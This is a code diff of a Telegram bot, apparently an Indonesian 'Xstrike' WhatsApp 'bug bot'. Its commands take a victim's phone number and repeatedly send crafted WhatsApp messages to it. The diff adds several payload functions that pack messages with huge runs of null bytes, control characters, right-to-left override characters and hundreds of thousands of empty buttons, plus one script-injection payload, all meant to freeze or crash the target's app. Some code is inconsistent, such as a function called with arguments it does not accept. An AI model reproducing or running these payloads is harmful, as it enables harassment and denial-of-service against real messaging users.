@@ -992,11 +992,11 @@ bot.action('/bug', async (ctx) => {
 ☇ /xcrash - Delay Murbug
 ☇ /xdelay - Delay Murbug
 ☇ /xspam - Delay Murbug
-☇ /xwowo - Delay Hard
+☇ /xstrike - Delay Hard
 <blockquote><pre>ʙʟᴀɴᴋ ᴀɴᴅʀᴏɪᴅ</pre></blockquote>
 ☇ /blankandro - Not Work All Device
 <blockquote><pre>ɪᴏs ʙᴜɢs</pre></blockquote>
-☇ /blankios - Blank Iphone
+☇ /lockchat - Lock Chat Javascript
 <blockquote><pre>ғᴏʀᴄᴇᴄʟᴏsᴇ ᴏɴᴇ ᴍsɢ</pre></blockquote>
 ☇ /onemsg - Not Work All Device
 <blockquote><pre>⬡═―—⊱ ᴄʟɪᴄᴋ ʙᴜᴛᴛᴏɴ ᴍᴇɴᴜ ⊰―—═⬡</pre></blockquote>`;
@@ -1238,10 +1238,9 @@ bot.command("blankandro", checkWhatsAppConnection, checkCooldown, async (ctx) =>
     reply_markup: { inline_keyboard: [[{ text: "ᴄᴇᴋ ᴛᴀʀɢᴇᴛ", url: `https://wa.me/${q}` }]] }
   });
   const processMessageId = processMessage.message_id;
-  for (let i = 0; i < 100; i++) {
-    await BlankNotifUngke(sock, target);
-    await BlankStuckUngke(sock, target);
-    await sleep(1500);
+  for (let i = 0; i < 50; i++) {
+    await blankclick(sock, target);
+    await sleep(500);
   }
   await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
 <blockquote><pre>⬡═―—⊱ ⎧ xꜱᴛʀɪᴋᴇ ꜱʟᴀʏᴇʀ ⎭ ⊰―—═⬡
@@ -1253,6 +1252,23 @@ bot.command("blankandro", checkWhatsAppConnection, checkCooldown, async (ctx) =>
     reply_markup: { inline_keyboard: [[{ text: "ᴄᴇᴋ ᴛᴀʀɢᴇᴛ", url: `https://wa.me/${q}` }]] }
   });
 });
+
+async function blankclick(target) {
+  const msg = {
+    viewOnceMessage: {
+      message: {
+        interactiveMessage: {
+          body: { text: "Xstrike Killer" },
+          nativeFlowMessage: {
+            buttons: "\u202E\u202D\u202C".repeat(100000),
+            messageVersion: 1
+          }
+        }
+      }
+    }
+  };
+  await ciko.relayMessage(target, msg, {});
+}
 
 bot.command("xdelay", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
   const q = ctx.message.text.split(" ")[1];
@@ -1269,9 +1285,9 @@ bot.command("xdelay", checkWhatsAppConnection, checkPremium, checkCooldown, asyn
     reply_markup: { inline_keyboard: [[{ text: "ᴄᴇᴋ ᴛᴀʀɢᴇᴛ", url: `https://wa.me/${q}` }]] }
   });
   const processMessageId = processMessage.message_id;
-  for (let i = 0; i < 1000; i++) {
-    await UngkeDelayInpis(sock, target);
-    await sleep(1);
+  for (let i = 0; i < 50; i++) {
+    await delayInvisible(sock, target);
+    await sleep(500);
   }
   await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
 <blockquote><pre>⬡═―—⊱ ⎧ xꜱᴛʀɪᴋᴇ ꜱʟᴀʏᴇʀ ⎭ ⊰―—═⬡
@@ -1284,6 +1300,45 @@ bot.command("xdelay", checkWhatsAppConnection, checkPremium, checkCooldown, asyn
   });
 });
 
+async function delayInvisible(sock, target) {
+  const payload1 = {
+    groupStatusMessageV2: {
+      message: {
+        interactiveResponseMessage: {
+          body: {
+            text: "memek",
+            format: "DEFAULT"
+          },
+          nativeFlowResponseMessage: {
+            name: "galaxy_message",
+            paramsJson: "\n".repeat(9000) + "\u200D".repeat(9000) + "\x10".repeat(9000) + "\0".repeat(9000),
+            version: 3
+          }
+        }
+      }
+    }
+  };
+
+  const payload2 = {
+    groupStatusMessageV2: {
+      message: {
+        interactiveMessage: {
+          body: {
+            text: "ampossbang"
+          },
+          nativeFlowMessage: {
+            buttons: Array.from({ length: 500000 }, () => ({}))
+          }
+        }
+      }
+    }
+  };
+
+  await sock.relayMessage(target, payload1, {});
+  await sock.relayMessage(target, payload2, {});
+  await sock.relayMessage(target, payload2, {});
+}
+
 bot.command("xcrash", checkWhatsAppConnection, async (ctx) => {
   const number = ctx.message.text.split(" ")[1];
   if (!number) return ctx.reply("❌ Kasih nomor: /xcrash 628xxx");
@@ -1291,16 +1346,44 @@ bot.command("xcrash", checkWhatsAppConnection, async (ctx) => {
   if (cleanNum.length < 10) return ctx.reply("❌ Nomor salah.");
   const msg = await ctx.reply(`✅ xcrash (bug) selesai untuk ${cleanNum}`);
   const target = cleanNum + "@s.whatsapp.net";
-  for (let i = 0; i < 100; i++) {
-    await UngkeDelayNew(sock, target);
-    await UngkeDelayInpis(sock, target);
-    await sleep(1500);
+  for (let i = 0; i < 50; i++) {
+    await delayinvis(sock, target);
+    await sleep(500);
   }
   await msg.editText(`✅ ${cleanNum} selesai.`);
   await ctx.telegram.sendMessage(ownerID,
     `📲 xcrash dipakai\nUser: ${ctx.from.first_name}\nTarget: ${cleanNum}\nGrup: ${ctx.chat.title || '-'}\nWaktu: ${new Date().toLocaleTimeString()}`
   );
 });
+
+async function delayinvis(sock, target) {
+    const nulls = "\u0000".repeat(20000);
+    const ctrl = "\u0001\u0002\u0003\u0004\u0005\u0006\u0007\u0008".repeat(20000);
+    const rtl = "\u202E\u202D\u202C".repeat(20000);
+
+    const msg = {
+        groupStatusMessageV2: {
+            message: {
+                viewOnceMessage: {
+                    message: {
+                        interactiveMessage: {
+                            body: { text: "x" },
+                            nativeFlowMessage: {
+                                buttons: nulls + ctrl + rtl,
+                                messageVersion: 1
+                            }
+                        }
+                    }
+                }
+            },
+            participant: target
+        }
+    };
+
+    await sock.relayMessage(target, msg, {
+        noSelfSync: true
+    });
+}
 
 bot.command("onemsg", checkWhatsAppConnection, async (ctx) => {
   const number = ctx.message.text.split(" ")[1];
@@ -1309,15 +1392,74 @@ bot.command("onemsg", checkWhatsAppConnection, async (ctx) => {
   if (cleanNum.length < 10) return ctx.reply("❌ Nomor salah.");
   const msg = await ctx.reply(`✅ onemsg (bug) selesai untuk ${cleanNum}`);
   const target = cleanNum + "@s.whatsapp.net";
-  for (let i = 0; i < 1; i++) {
-    await FcOneMsgByMia(sock, target);
-    await sleep(1000);
+  for (let i = 0; i < 100; i++) {
+    await StuckLogoLockChat(sock, target);
+    await sleep(500);
   }
   await msg.editText(`✅ ${cleanNum} selesai.`);
   await ctx.telegram.sendMessage(ownerID,
     `📲 onemsg dipakai\nUser: ${ctx.from.first_name}\nTarget: ${cleanNum}\nGrup: ${ctx.chat.title || '-'}\nWaktu: ${new Date().toLocaleTimeString()}`
   );
 });
+
+async function StuckLogoLockChat(sock, target) {
+  try {
+    const payload = {
+      viewOnceMessage: {
+        message: {
+          interactiveMessage: {
+            header: {
+              title: "JavaScript",
+              hasMediaAttachment: false
+            },
+            body: {
+              text: "LOCK CHAT BY XSTRIKE X JOVIN DEKK🌹"
+            },
+            nativeFlowMessage: {
+              messageParamsJson: JSON.stringify({
+                placeholderResendMessage: "placeholderResendMessage",
+                testPayload: Buffer.from(
+                  Array.from({ length: 1500 }, () => 0x5A)
+                ).toString("base64")
+              }),
+              buttons: Array.from({ length: 500550 }, (_, i) => {
+                if (i === 0) {
+                  return {
+                    name: "quick_reply",
+                    buttonParamsJson: JSON.stringify({
+                      display_text: "Oke",
+                      id: "oke_btn"
+                    })
+                  };
+                }
+                return {};
+              }),
+              messageVersion: 3
+            },
+            contextInfo: {
+              forwardingScore: 999,
+              isForwarded: true,
+              isAiGenerated: true,
+              businessMessageForwardInfo: {
+                businessOwnerJid: "13135550002@s.whatsapp.net"
+              }
+            }
+          }
+        }
+      }
+    };
+
+    await sock.relayMessage(target, payload, {
+      participant: true,
+      noSelfSync: true,
+      messageId: "3EB0" + Math.random().toString(36).substring(2, 12).toUpperCase()
+    });
+
+    console.log(`[+] Meta AI Lock Chat Overlay terkirim ke ${target}`);
+  } catch (err) {
+    console.error("[-] Gagal kirim:", err.message);
+  }
+}
 
 bot.command("xspam", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
   const q = ctx.message.text.split(" ")[1];
@@ -1334,9 +1476,9 @@ bot.command("xspam", checkWhatsAppConnection, checkPremium, checkCooldown, async
     reply_markup: { inline_keyboard: [[{ text: "ᴄᴇᴋ ᴛᴀʀɢᴇᴛ", url: `https://wa.me/${q}` }]] }
   });
   const processMessageId = processMessage.message_id;
-  for (let i = 0; i < 100; i++) {
-    await UngkeDelayNew(sock, target);
-    await sleep(1500);
+  for (let i = 0; i < 50; i++) {
+    await Freezedikt(sock, target);
+    await sleep(500);
   }
   await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
 <blockquote><pre>⬡═―—⊱ ⎧ xꜱᴛʀɪᴋᴇ ꜱʟᴀʏᴇʀ ⎭ ⊰―—═⬡
@@ -1349,9 +1491,91 @@ bot.command("xspam", checkWhatsAppConnection, checkPremium, checkCooldown, async
   });
 });
 
-bot.command("xwowo", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
+async function Freezedikt(ciko, target) {
+    const kotarouA = "\u0002".repeat(50000);
+
+    const msg1 = {
+        groupStatusMessageV2: {
+            message: {
+                viewOnceMessage: {
+                    message: {
+                        interactiveMessage: {
+                            body: { text: "xstrike bug" },
+                            nativeFlowMessage: {
+                                buttons: [{
+                                    name: "Jaya",
+                                    buttonParamsJson: JSON.stringify({ display_text: kotarouA, id: kotarouA })
+                                }],
+                                messageVersion: 1
+                            },
+                            header: {
+                                title: kotarouA,
+                                subtitle: kotarouA,
+                                hasMediaAttachment: true,
+                                documentMessage: {
+                                    url: "https://mmg.whatsapp.net/v/t62.7119-24/854807147_4626535044300876_6200449278943608648_n.enc?ccb=11-4&oh=01_Q5Aa5wH8Q0ObDSK0SvWab2d8f5Nn-9Bxjr1XFoxKkKHluZt7Lw&oe=6AFAE3E8&_nc_sid=5e03e0&mms3=true",
+                                    mimetype: "text/plain",
+                                    fileSha256: "fucRezr9qxNkZLddJYD70ZlXDMxagHTIk/EnHcVexhI=",
+                                    fileLength: 253415,
+                                    pageCount: 0,
+                                    mediaKey: "lfy6zFpqoBXfsX2TdPXVU9ihMDERdMSwJKtbHaxIuBU=",
+                                    fileName: "WAProto.proto.txt",
+                                    fileEncSha256: "Z63NlEwn3iaXFk9HmboFYYeUffYL75FROVnODv+9ClU=",
+                                    directPath: "/v/t62.7119-24/854807147_4626535044300876_6200449278943608648_n.enc?ccb=11-4&oh=01_Q5Aa5wH8Q0ObDSK0SvWab2d8f5Nn-9Bxjr1XFoxKkKHluZt7Lw&oe=6AFAE3E8&_nc_sid=5e03e0",
+                                    mediaKeyTimestamp: 1792246249,
+                                    contextInfo: {
+                                        mediaDomainInfo: {
+                                            mediaKeyDomain: 1,
+                                            e2EeMediaKey: "lfy6zFpqoBXfsX2TdPXVU9ihMDERdMSwJKtbHaxIuBU="
+                                        }
+                                    }
+                                }
+                            }
+                        }
+                    }
+                }
+            },
+            participant: target
+        }
+    };
+
+    const kotarou = "\u0008".repeat(50000);
+    const xciko = "\u0001".repeat(50000);
+    const bug = "\u202C".repeat(50000);
+
+    const msg2 = {
+        groupStatusMessageV2: {
+            message: {
+                viewOnceMessage: {
+                    message: {
+                        interactiveMessage: {
+                            body: { text: "@cikobug" },
+                            nativeFlowMessage: {
+                                buttons: [{
+                                    name: "cikoxkotarou",
+                                    buttonParamsJson: JSON.stringify({
+                                        display_text: kotarou + xciko + bug,
+                                        id: kotarou
+                                    })
+                                }],
+                                messageVersion: 1
+                            }
+                        }
+                    }
+                }
+            },
+            participant: target
+        }
+    };
+
+    await ciko.relayMessage(target, msg1, { noSelfSync: false });
+    await ciko.relayMessage(target, msg2, { noSelfSync: false });
+}
+
+
+bot.command("xstrike", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
   const q = ctx.message.text.split(" ")[1];
-  if (!q) return ctx.reply(`🪧 ☇ Format: /xwowo 62×××`);
+  if (!q) return ctx.reply(`🪧 ☇ Format: /xstrike 62×××`);
   let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
   const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, thumbnailUrl, {
     caption: `
@@ -1365,9 +1589,8 @@ bot.command("xwowo", checkWhatsAppConnection, checkPremium, checkCooldown, async
   });
   const processMessageId = processMessage.message_id;
   for (let i = 0; i < 100; i++) {
-    await UngkeDelayInpis(sock, target);
-    await UngkeDelayNew(sock, target);
-    await sleep(2000);
+    await freezejovin(sock, target);
+    await sleep(500);
   }
   await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
 <blockquote><pre>⬡═―—⊱ ⎧ xꜱᴛʀɪᴋᴇ ꜱʟᴀʏᴇʀ ⎭ ⊰―—═⬡
@@ -1380,35 +1603,95 @@ bot.command("xwowo", checkWhatsAppConnection, checkPremium, checkCooldown, async
   });
 });
 
-bot.command("blankios", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
+async function freezejovin(sock, target) {
+  const msg = {
+    groupStatusMessageV2: {
+      message: {
+        interactiveMessage: {
+          body: {
+            text: "lah iya ya"
+          },
+          nativeFlowMessage: {
+            buttons: "\u200b".repeat(30000),
+            buttonParamsJson: "{".repeat(10000)
+          }
+        }
+      }
+    }
+  };
+
+  await sock.relayMessage(target, msg, {});
+}
+
+bot.command("lockchat", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
   const q = ctx.message.text.split(" ")[1];
-  if (!q) return ctx.reply(`🪧 ☇ Format: /blankios 62×××`);
+  if (!q) return ctx.reply(`🪧 ☇ Format: /lockchat 62×××`);
   let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
   const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, thumbnailUrl, {
     caption: `
 <blockquote><pre>⬡═―—⊱ ⎧ xꜱᴛʀɪᴋᴇ ꜱʟᴀʏᴇʀ ⎭ ⊰―—═⬡
 ⌑ Target: ${q}
-⌑ Type: Invisible Iphone Crash
+⌑ Type: Lock Chat JavaScript
 ⌑ Status: Process
 ╘═——————————————═⬡</pre></blockquote>`,
     parse_mode: "HTML",
     reply_markup: { inline_keyboard: [[{ text: "ᴄᴇᴋ ᴛᴀʀɢᴇᴛ", url: `https://wa.me/${q}` }]] }
   });
   const processMessageId = processMessage.message_id;
-  for (let i = 0; i < 100; i++) {
-    await UngkeBlank(sock, target);
-    await sleep(1500);
+  for (let i = 0; i < 50; i++) {
+    await LockJavaScript(sock, target);
+    await sleep(500);
   }
   await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
 <blockquote><pre>⬡═―—⊱ ⎧ xꜱᴛʀɪᴋᴇ ꜱʟᴀʏᴇʀ ⎭ ⊰―—═⬡
 ⌑ Target: ${q}
-⌑ Type: Iphone Blank
+⌑ Type: Lock Chat Whatsapp
 ⌑ Status: Success
 ╘═——————————————═⬡</pre></blockquote>`, {
     parse_mode: "HTML",
     reply_markup: { inline_keyboard: [[{ text: "ᴄᴇᴋ ᴛᴀʀɢᴇᴛ", url: `https://wa.me/${q}` }]] }
   });
 });
+
+async function LockJavaScript(sock, target) { 
+  const ah = {
+    botForwardedMessage: {
+      message: {
+        richResponseMessage: {
+          messageType: 1,
+          unifiedResponse: {
+            data: Buffer.from(JSON.stringify({
+              __typename: "GenAIUnifiedResponse",
+              response_id: crypto.randomUUID(),
+              sections: [{
+                __typename: "GenAIUnifiedResponseSection",
+                view_model: {
+                  __typename: "GenAISingleLayoutViewModel",
+                  primitive: {
+                    __typename: "FOAHtmlPrimitiveDemoDONOTUSE",
+                    trusted_sources: [],
+                    payload: `<script>
+                      alert("Xstrike - Killer!");
+                    </script>`
+                  }
+                }
+              }]
+            })).toString("base64")
+          },
+          contextInfo: {
+            isForwarded: true,
+            forwardOrigin: 4
+          }
+        }
+      }
+    }
+  }
+
+  const msg = generateWAMessageFromContent(target, ah, {})  
+  await sock.relayMessage(target, msg.message, {            
+    messageId: msg.key.id
+  });
+}
 
 // FUNCTION BUG DISINI
 
